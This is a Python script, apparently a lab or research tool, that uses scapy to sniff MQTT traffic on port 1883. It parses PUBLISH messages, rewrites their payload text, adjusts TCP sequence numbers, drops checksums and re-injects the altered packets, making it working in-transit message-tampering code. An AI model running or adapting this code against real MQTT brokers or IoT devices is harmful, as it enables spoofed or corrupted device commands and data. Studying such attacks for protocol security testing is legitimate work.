import codecs
# import random

from scapy.all import *
from scapy.contrib.mqtt import MQTT
from scapy.layers.inet import TCP, IP

import logging
import CONST
from scapy.layers.l2 import Ether

logging.basicConfig(
    level=logging.NOTSET,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s'
)

packetList = []

ERROR_MESSAGE = {
    0: 'MQTT TYPE ERROR'
}

# 设置监听的网络接口和过滤条件
interface = "Realtek PCIe 2.5GbE Family Controller"  # 替换为你的网络接口名称
filter_rule = f"tcp port 1883 and dst host {CONST.IP_ADDRESS}"


def analysis_pcap(file: str):
    """
    GET THE PCAP INSIDE
    :param file:
    :return:
    """
    packages = rdpcap(file)
    logging.debug(
        msg=f'packages <{packages}> - <{packages.stats}>'
    )
    for i, p in enumerate(packages):
        logging.debug(
            msg=f'package<{i}> - <{p}>'
        )
    return packages


def seek_tcp_package(packages):
    tcpPackages = []
    for package in packages:
        if package.haslayer(TCP):
            tcpPackages.append(package)
    logging.debug(
        msg=f'seek tcp -> <{tcpPackages}>'
    )
    return tcpPackages


def seek_package_tcp_payload(tcpPackage: Packet):
    """
    找到mqtt payload的范围 返回mqtt payload的大小
    :param tcpPackage: 单独一个包
    :return:
    """
    loop_package = tcpPackage
    name = loop_package.name
    while name != 'NoPayload':
        if name == TCP().name:
            break
        loop_package = loop_package.payload
        name = loop_package.name
    if name == 'NoPayload':
        return -1
    return len(loop_package.payload)


def charToHex(a):
    """
    kill '0x'
    :param a:
    :return:
    """
    hexList = []
    for c in a:
        newHex = str(hex(ord(c)))
        hexList.append(newHex.replace("0x", ""))
    return hexList


def fixHex(packet):
    original_bytestream = packet.original
    hex_array = [format(byte, '02x') for byte in original_bytestream]
    return hex_array


class TcpPacket:
    def __init__(self, payload_len, packet):  # here packet should be a list of hex values
        self.entirePacket = packet
        self.mqtt = packet[-payload_len:]
        self.payload_len = payload_len
        self.mqttType = self.typeMap(self.mqtt[0])
        # print(self.mqttType)
        self.qos = self.detect_qos(self.mqtt[0])
        if self.mqttType[0] == 3:
            self.mqttPacket = MqttPublish(self.mqtt)
        else:
            self.mqttPacket = None  # rest of packet will be MQTT

    def typeMap(self, hexVal):
        meanings = {
            "0": 0,
            "1": 1,
            "2": 2,
            "3": 3,
            "4": 4,
            "5": 5,
            "6": 6,
            "7": 7,
            "8": 8,
            "9": 9,
            "a": 10,
            "b": 11,
            "c": 12,
            "d": 13,
            "e": 14,
            "f": 15
        }
        hexToCommand = {
            1: "Connect Command",
            2: "Connect Ack",
            3: "Publisher Message",
            4: "PUBACK",
            5: "Publish Received",
            6: "Publish Release",
            7: "Publish Complete",
            8: "Suscribe Request",
            9: "Suscribe Ack",
            10: "Unsuscribe Request",
            11: "Unsuscribe Ack",
            12: "Ping Request",
            13: "Ping Response",
            14: "Disconnect Req",
            15: "AUTH",
        }
        a = meanings[hexVal[0]]
        b = hexToCommand[a]
        return (a, b)

    def rebuildPacket(self):
        newPacket = self.entirePacket[:-self.payload_len]
        newPayloadLength, hexval = self.mqttPacket.getHex()
        newPacket = newPacket + hexval
        # return newPacket
        self.entirePacket = newPacket
        self.payload_len = newPayloadLength
        self.mqtt = self.entirePacket[-newPayloadLength:]
        return self.entirePacket

    def detect_qos(self, hexVal):
        qos = int(bin(int(hexVal, 16))[2:].zfill(8)[5:7], 2)
        return qos


# class for the mqtt Connect Command
class MqttPublish:
    def __init__(self, mqtt):
        self.entirePacket = mqtt
        code, word = self.typeMap(mqtt[0])
        self.messageType = mqtt[0]
        self.qos = self.detect_qos(mqtt[0])
        self.msgid_len = 0 if self.qos == 0 else 2
        self.messageTypeWord = word
        self.messageLength = mqtt[1]
        self.messageLengthNum = self.hexToInt(self.messageLength)
        self.topicLength = mqtt[2:4]
        self.topicLengthNum = self.hexToInt(self.topicLength)
        self.topicName = self.findTopicName(self.topicLength, mqtt)
        self.message = mqtt[self.topicLengthNum +
                            4 +
                            self.msgid_len +
                            self.hexToInt(mqtt[self.topicLengthNum + 4 + self.msgid_len]) +
                            1:]
        self.message_payload_length = len(self.message)
        self.properties = mqtt[
                          self.topicLengthNum + 4 + self.msgid_len
                          :
                          self.topicLengthNum + 4 + self.msgid_len + self.hexToInt(
                              mqtt[self.topicLengthNum + 4 + self.msgid_len]) + 1
                          ]
        self.messageWords = codecs.decode("".join(self.message), "hex")
        self.messageWords = codecs.decode(self.messageWords, "utf-8")
        if (len(mqtt) - self.messageLengthNum - 2) == 0:
            self.disconnect = False
        else:
            self.disconnect = True

        if self.msgid_len != 0:
            self.msgid = mqtt[4 + self.topicLengthNum:4 + self.topicLengthNum + 2]
        else:
            self.msgid = []

    def findTopicName(self, topicLength, mqtt):
        length = self.hexToInt(topicLength)  # convert hex string to int
        topicName = mqtt[4:4 + length]
        return (topicName)

    def hexToInt(self, length):
        return (int("".join(length), 16))

    def detect_qos(self, hexVal):
        qos = int(bin(int(hexVal, 16))[2:].zfill(8)[5:7], 2)
        return qos

    def typeMap(self, hexVal):
        meanings = {
            "0": 0,
            "1": 1,
            "2": 2,
            "3": 3,
            "4": 4,
            "5": 5,
            "6": 6,
            "7": 7,
            "8": 8,
            "9": 9,
            "a": 10,
            "b": 11,
            "c": 12,
            "d": 13,
            "e": 14,
            "f": 15
        }
        hexToCommand = {
            1: "Connect Command",
            2: "Connect Ack",
            3: "Publisher Message",
            4: "PUBACK",
            5: "Publish Received",
            6: "Publish Release",
            7: "Publish Complete",
            8: "Suscribe Request",
            9: "Suscribe Ack",
            10: "Unsuscribe Request",
            11: "Unsuscribe Ack",
            12: "Ping Request",
            13: "Ping Response",
            14: "Disconnect Req",
            15: "AUTH",
        }
        a = meanings[hexVal[0]]
        b = hexToCommand[a]
        return (a, b)

    def changeMessage(self, newMessage):  # since MQTT doesn't have a checksum we can just go ahead and alter the packet
        self.messageWords = newMessage
        self.messageLengthNum = self.messageLengthNum - (self.message_payload_length - len(newMessage))
        self.messageLength = hex(self.messageLengthNum)
        message = []
        for letter in newMessage:
            message.append(hex(ord(letter)))
        self.message = message

    def getHex(self):
        full = []
        # meanings = {0: "10", 1: "20", 2: "82", 3: "90", 4: "30", 5: "c0", 6: "d0", 7: "31"}
        # [full.append(meanings[int(x)]) for x in self.messageType]
        full.append(self.messageType)
        a = self.messageLength.replace("0x", "")
        if len(a) < 2:
            a = '0' + a
        full.append(a)
        # [full.append(x) for x in a]
        [full.append(x) for x in self.topicLength]
        [full.append(x) for x in self.topicName]
        # + or - msgid
        for x in self.msgid:
            full.append(x)
        # + or - properties
        for x in self.properties:
            full.append(x)
        # + message
        [full.append(x.replace("0x", "")) for x in self.message]
        newPayloadLength = len(full)
        if self.disconnect == True:
            full.append("e0")
            full.append("00")
        return newPayloadLength, full


def onlyMQTTPackets(packets):
    processedPackets = []
    for packet in packets:
        processedPackets.append(TcpPacket(packet[0], packet[1]))

    messageRequests = []
    for pPacket in processedPackets:
        num, word = pPacket.mqttType
        if num == 3:
            messageRequests.append(pPacket)
    return messageRequests


def editMessage(msgPackage: TcpPacket, newMessage='None'):
    if msgPackage.mqttPacket is None:
        raise Exception(ERROR_MESSAGE.get(0))

    messageWords = msgPackage.mqttPacket.messageWords
    logging.debug(
        msg=f'editMessage - <{msgPackage}> - OLD MESSAGE = <{messageWords}> - NEW MESSAGE = <{newMessage}>'
    )
    msgPackage.mqttPacket.changeMessage(newMessage)
    checkNewMessage = msgPackage.mqttPacket.messageWords
    logging.debug(
        msg=f'CHECK = <{newMessage == checkNewMessage}> -> checkNewMessage = <{checkNewMessage}>'
    )
    msgPackage.rebuildPacket()
    return msgPackage


def modify_mqtt_package(packet: Packet):
    newMessage = 'TESTING_NOT_NONE'
    if (packet.haslayer(Raw) or packet.haslayer(MQTT)) and packet[TCP].dport == 1883:
        logging.debug(
            msg=f'packet <{packet}> - MQTT?=<{packet.haslayer(MQTT)}> - Raw?=<{packet.haslayer(Raw)}>'
        )
        payload_length = seek_package_tcp_payload(tcpPackage=packet)
        toHex = fixHex(packet)
        toTcpPackage = TcpPacket(payload_len=payload_length, packet=toHex)
        type_num, word = toTcpPackage.mqttType
        if type_num != 3:
            send(packet, verbose=0)
        else:
            if toTcpPackage.mqttPacket.messageWords == newMessage:
                pass
            else:
                logging.info(
                    msg="MESSAGE EDITING!"
                )
                after_edit_strhexval = editMessage(msgPackage=toTcpPackage, newMessage=newMessage)
                packet = bytes_to_packet(after_edit_strhexval.entirePacket,
                                         before_package_length=after_edit_strhexval.payload_len)
                time.sleep(0.5)
                send(packet, verbose=3, iface=interface)


def hexstrToint(strlist):
    n = len(strlist)
    for i in range(n):
        strlist[i] = int(strlist[i], 16)
    return strlist


def bytes_to_packet(data, before_package_length):
    # logging.debug(msg=f'before_package_length = <{before_package_length}>')

    data = hexstrToint(data)
    ipnewlen = len(data) - 14
    eth_pkt = Ether(bytes(data))
    # mqtt_len = len(eth_pkt[TCP].payload)
    if eth_pkt.haslayer('TCP'):
        eth_pkt[TCP].ack += (before_package_length + 1)
        eth_pkt[TCP].seq += (before_package_length + 1)
    package = eth_pkt
    if IP in eth_pkt:
        package = eth_pkt[IP]
        del package.chksum
        del package[TCP].chksum
        package.len = ipnewlen
        # package[IP].len = ipnewlen

    # detect_package = package.copy()
    # if IP in detect_package:
    #     detect_package[TCP].payload = NoPayload()
    #     detect_package[IP].len -= mqtt_len
    #     detect_package[TCP].flags = 'A'
    #     detect_package[TCP].ack += mqtt_len
    #     detect_package[TCP].seq += mqtt_len
    #     detect_package[TCP].window = package[TCP].window - 1

    # if IP in eth_pkt:
    #     ip_pkt = eth_pkt[IP]
    #     if TCP in ip_pkt:
    #         tcp_pkt = ip_pkt[TCP]
    #         # del ip_pkt.chksum  # 46599
    #         # del tcp_pkt.chksum  # 49892
    #         # ip_pkt = ip_pkt.__class__(bytes(ip_pkt))
    #         # tcp_pkt = tcp_pkt.__class__(bytes(tcp_pkt))
    #         # ip_pkt.add_payload(tcp_pkt)
    #         # ip_pkt = ip_pkt.__class__(bytes(ip_pkt))
    #         package = eth_pkt / ip_pkt / tcp_pkt
    #         return package
    return package


def get_all_interfaces():
    interfaces = conf.ifaces
    logging.debug(
        msg=f'\n{interfaces}\n'
    )
    # for ifaceee in interfaces:
    #     logging.debug(
    #         msg=f'INTERFACE:<{ifaceee.name}>'
    #     )


if __name__ == '__main__':
    get_all_interfaces()
    packages = analysis_pcap('./mqttv5_only.pcap')

    # rawlist = []
    # for p in packages:
    #     print(str(raw(p))) # this can replace str
    tcp_packages = seek_tcp_package(packages=packages)
    for tp in tcp_packages:
        packetList.append((seek_package_tcp_payload(tcpPackage=tp), fixHex(tp)))
    print(packetList)
    msg_packages = onlyMQTTPackets(packetList)
    print(msg_packages)

    msg_packages[0] = editMessage(msg_packages[0])
    print(msg_packages)
    ans = bytes_to_packet(msg_packages[0].entirePacket, 0)
    print(ans)
    modify_mqtt_package(packet=packages[6])

    sniff(iface=interface, filter=filter_rule, prn=modify_mqtt_package, session=IPSession, store=False)
